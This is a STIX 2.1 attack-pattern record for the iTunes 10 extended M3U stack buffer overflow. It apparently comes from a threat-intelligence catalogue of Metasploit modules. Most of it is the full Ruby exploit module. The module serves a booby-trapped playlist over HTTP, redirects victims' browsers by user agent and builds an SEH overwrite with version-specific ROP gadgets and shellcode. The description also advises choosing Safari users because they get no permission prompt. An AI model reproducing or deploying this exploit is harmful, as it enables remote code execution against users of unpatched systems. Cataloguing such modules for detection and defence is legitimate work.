{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2eead730-c064-4916-ad2a-ee4562ddc4d2",
    "created": "2024-08-14T16:46:13.322108Z",
    "modified": "2024-08-14T16:46:13.322112Z",
    "name": "Apple iTunes 10 Extended M3U Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7. When opening an extended .m3u file containing an \"#EXTINF:\" tag description iTunes will copy the content after \"#EXTINF:\" without appropriate checking from a heap buffer to a stack buffer, writing beyond the stack buffer's boundary which allows code execution under the context of the user.  Please note before using this exploit, you must have precise knowledge of the victim machine's QuickTime version (if installed), and then select your target accordingly.  In addition, even though this exploit can be used as remote, you should be aware the victim's browser behavior when opening an itms link.  For example IE/Firefox/Opera by default will ask the user for permission before launching the itms link by iTunes.  Chrome will ask for permission, but also spits a warning. Safari would be an ideal target, because it will open the link without any user interaction. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/itunes_extm3u_bof.rb",
            "external_id": "itunes_extm3u_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://pastehtml.com/view/c25uhk4ab.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple iTunes 10 Extended M3U Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7.\n        When opening an extended .m3u file containing an \"#EXTINF:\" tag description,\n        iTunes will copy the content after \"#EXTINF:\" without appropriate checking\n        from a heap buffer to a stack buffer, writing beyond the stack buffer's boundary,\n        which allows code execution under the context of the user.\n\n        Please note before using this exploit, you must have precise knowledge of the\n        victim machine's QuickTime version (if installed), and then select your target\n        accordingly.\n\n        In addition, even though this exploit can be used as remote, you should be aware\n        the victim's browser behavior when opening an itms link.  For example,\n        IE/Firefox/Opera by default will ask the user for permission before launching the\n        itms link by iTunes.  Chrome will ask for permission, but also spits a warning.\n        Safari would be an ideal target, because it will open the link without any\n        user interaction.\n      },\n      'Author'         =>\n        [\n          'Rh0 <rh0[at]z1p.biz>',  # discovery and metasploit module\n          'sinn3r'                 #Mo' targets & code cleanup, etc\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => ['win'],\n      'Arch'           => ARCH_X86,\n      'Payload'        =>\n        {\n          'Space'          => 1000,\n          'BadChars'       => \"\\x00\\x0a\\x0d\",\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\xfc\\xfb\\xff\\xff\" # ADD ESP, -0x404\n        },\n      'References'     =>\n        [\n          [ 'OSVDB', '83220' ],\n          [ 'EDB', '19322' ],\n          [ 'URL', 'http://pastehtml.com/view/c25uhk4ab.html' ]\n        ],\n      'DisclosureDate' => '2012-06-21',\n      'Targets'        =>\n        [\n          # Default package for iTunesSetup104.exe\n          ['iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.69 on XP SP3',\n            {\n              'Ret'     => 0x669C197B, # ADD ESP,0xD40 / ret [QuickTime.qts]\n              'ROP_NOP' => 0x66801044  # RET\n            }\n          ],\n          # Default package for iTunesSetup1041.exe\n          [ 'iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.70 on XP SP3',\n            {\n              'Ret'     => 0x6693A96B, # ADD ESP,0xD40 / ret [QuickTime.qts]\n              'ROP_NOP' => 0x66801044  # RET\n            }\n          ],\n          [ 'iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.71 on XP SP3',\n            {\n              'Ret'     => 0x6693ACBB, # ADD ESP,0xD40 / ret [QuickTime.qts]\n              'ROP_NOP' => 0x66801044  # RET\n            }\n          ],\n          ['iTunes 10.4.0.80 to 10.6.1.7 with QuickTime 7.72 on XP SP3',\n            {\n              'Ret'     => 0x6693afab, # ADD ESP,0xD40 / ret [QuickTime.qts]\n              'ROP_NOP' => 0x66801044  # RET\n            }\n          ]\n        ]\n    ))\n  end\n\n\n  def on_request_uri(cli,request)\n    # re-generate the payload\n    return if ((p = regenerate_payload(cli).encoded) == nil)\n\n    host = request.headers['HOST']\n    agent = request.headers['USER-AGENT']\n\n    # iTunes browser link\n    m3u_location = \"itms://#{host}#{get_resource()}/#{rand_text_alphanumeric(8+rand(8))}.m3u\"\n\n    if request.uri =~ /\\.ico$/i\n      # Discard requests for ico files\n      send_not_found(cli)\n    elsif request.uri =~ /\\.m3u$/i\n      print_status(\"Target: #{target.name}\")\n      print_status(\"Sending playlist\")\n      send_response(cli, generate_m3u(p), { 'Content-Type' => 'audio/x-mpegurl' })\n    elsif agent =~ /MSIE (6|7|8)\\.0/ and agent =~ /NT 5\\.1/\n      print_status(\"Redirecting to playlist\")\n      send_response(cli, generate_redirect_ie(m3u_location), { 'Content-Type' => 'text/html' })\n    elsif agent =~ /NT 5\\.1/\n      # redirect Firefox, Chrome, Opera, Safari to iTunes link\n      print_status(\"Redirecting to playlist\")\n      send_redirect(cli, m3u_location)\n    else\n      print_status(\"Unknown User-Agent: #{agent}\")\n      send_not_found(cli)\n    end\n  end\n\n\n  # IE did not proper redirect when retrieving an itms:// location redirect via a HTTP header...\n  # ... so use html\n  def generate_redirect_ie(m3u_location)\n    ie_redir = <<-HTML_REDIR\n      <!DOCTYPE HTML>\n      <html>\n      <head>\n      <meta http-equiv=\"refresh\" content=\"0; URL=#{m3u_location}\">\n      </head>\n      </html>\n    HTML_REDIR\n\n    ie_redir = ie_redir.gsub(/^ {6}/, '')\n\n    return ie_redir\n  end\n\n\n  def generate_m3u(payload)\n    # Bypass stack cookies by triggering a SEH exception before\n    # the cookie gets checked. SafeSEH is bypassed by using a non\n    # safeSEH DLL [QuickTime.qts].\n\n    # stack buffer overflow ->\n    # overwrite SEH handler ->\n    # trigger SEH exception ->\n    # rewind stack (ADD ESP, ...) and land in ROP NOP sled\t->\n    # virtualprotect and execute shellcode\n\n    m3u = '#EXTINF:,'\n\n    # stack layout depends on what iTunes is doing (running or not, playing music etc.) ...\n    # ... so ensure we overwrite a SEH handler to get back to our rop chain\n    m3u << [target.ret].pack(\"V\") * 0x6a       # stack pivot/rewind\n    m3u << [target['ROP_NOP']].pack(\"V\") * 30  # ROP NOP sled\n    m3u << gimme_rop\n    m3u << payload\n\n    # 0x1000 should be enough to overflow the stack and trigger SEH\n    m3u << rand_text_alphanumeric(0x1000 - m3u.length)\n\n    return m3u\n\n  end\n\n\n  def gimme_rop\n    # thanx to mona.py :)\n    rop_chain = [\n      :popad,\n      # registers\n      0x66801044,  # EDI: RET\n      0x7c801ad4,  # ESI: VirtualProtect [kernel32.dll]\n      :jmpesp,\n      junk,\n      :ebx,        # EBX: Becomes 0x3e8\n      0xffffffd6,  # EDX: Becomes 0x40\n      0x673650b0,  # ECX: lpflOldProtect\n      0x90909090,  #EAX\n      # correct dwSize and flNewProtect\n      :modebx,\n      :addedx,\n      # throw it on the stack\n      :pushad\n    ]\n\n    # Map gadgets to a specific Quicktime version\n    rop_chain.map! { |g|\n      case target.name\n      when /QuickTime 7\\.69/\n        case g\n        when :popad  then 0x66C3E260\n        when :jmpesp then 0x669F6E21\n        when :ebx    then 0x4CC48017\n        when :modebx then 0x669A8648  # xor ebx,4CC483FF; ret\n        when :addedx then 0x669FC1C6  # add edx, 0x6a; ret\n        when :pushad then 0x6682A67E\n        else\n          g\n        end\n\n      when /QuickTime 7\\.70/\n        case g\n        when :popad  then 0x66926F5B\n        when :jmpesp then 0x66d6b743\n        when :ebx    then 0x6c1703e8\n        when :modebx then 0x66b7d8cb  # add ebx, 0x93E90000 ; ret\n        when :addedx then 0x66975556  # add edx, 0x6a; ret\n        when :pushad then 0x6689B829\n        else\n          g\n        end\n\n      when /QuickTime 7\\.71/\n        case g\n        when :popad  then 0x668E2BAA\n        when :jmpesp then 0x66965F78\n        when :ebx    then 0x6c1703e8\n        when :modebx then 0x66B7DC4B  # add ebx, 0x93E90000 ; ret\n        when :addedx then 0x66975956  # add edx, 0x6a; ret\n        when :pushad then 0x66C28B70\n        else\n          g\n        end\n\n      when /QuickTime 7\\.72/\n        case g\n        when :popad  then 0x66c9a6c0\n        when :jmpesp then 0x6697aa03\n        when :ebx    then 0x6c1703e8\n        when :modebx then 0x66b7de1b  # add ebx, 0x93E90000 ; ret\n        when :addedx then 0x66975c56  # add edx, 0x6a; ret\n        when :pushad then 0x6684b5c6\n        else\n          g\n        end\n      end\n    }\n\n    rop_chain.pack(\"V*\")\n  end\n\n\n  def junk\n    rand_text_alpha(4).unpack(\"L\")[0].to_i\n  end\nend\n\n=begin\n0:000> r\neax=0e5eb6a0 ebx=00000000 ecx=00000183 edx=00000003 esi=0e5eb091 edi=00130000\neip=10ceaa7a esp=0012ee5c ebp=0012ee64 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\niTunes_10000000!iTunesMainEntryPoint+0xb93f3a:\n10ceaa7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:000> k\nChildEBP RetAddr\nWARNING: Stack unwind information not available. Following frames may be wrong.\n0012ee64 10356284 iTunes_10000000!iTunesMainEntryPoint+0xb93f3a\n0012eea4 1035657c iTunes_10000000!iTunesMainEntryPoint+0x1ff744\n0012eed8 1034de49 iTunes_10000000!iTunesMainEntryPoint+0x1ffa3c\n00000000 00000000 iTunes_10000000!iTunesMainEntryPoint+0x1f7309\n0:000> !address esi\n    0c720000 : 0d87d000 - 00ea3000\n                    Type     00020000 MEM_PRIVATE\n                    Protect  00000004 PAGE_READWRITE\n                    State    00001000 MEM_COMMIT\n                    Usage    RegionUsageHeap\n                    Handle   0c720000\n0:000> !address edi-10\n    00030000 : 000ee000 - 00042000\n                    Type     00020000 MEM_PRIVATE\n                    Protect  00000004 PAGE_READWRITE\n                    State    00001000 MEM_COMMIT\n                    Usage    RegionUsageStack\n                    Pid.Tid  d1c.d0c\n=end\n",
    "x_mitre_disclosure_date": "2012-06-21",
    "x_mitre_platforms": [
        "['win']"
    ]
}